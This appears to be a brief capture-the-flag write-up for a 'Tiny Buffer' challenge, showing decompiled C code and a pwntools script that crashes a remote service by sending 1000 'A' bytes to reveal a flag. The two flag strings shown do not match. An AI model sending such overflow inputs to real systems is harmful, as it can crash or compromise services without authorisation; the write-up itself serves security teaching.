# Tiny Buffer

To get the flag we need to look in the main function:
```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char src[104]; // [esp+Ch] [ebp-6Ch] BYREF

  setvbuf(stdout, 0, 2, 0);
  signal(11, segfaultHandler);
  printf("Enter a string: ");
  __isoc99_scanf("%99s", src);
  vulnerableFunction(src);
  return 0;
}
void __noreturn segfaultHandler()
{
  puts("T43CTF{DOWNLOAD}");
  exit(1);
}
```

So we can see that if we cause a segfault to trigger we get the flag printed.
A code that would do that is this one:
```python
#!/bin/python3
from pwn import *
p=remote("ctf.t43.ro",24679)
p.sendline(b'A'*1000)
p.interactive()
```

flag: `T43CTF{segfault}`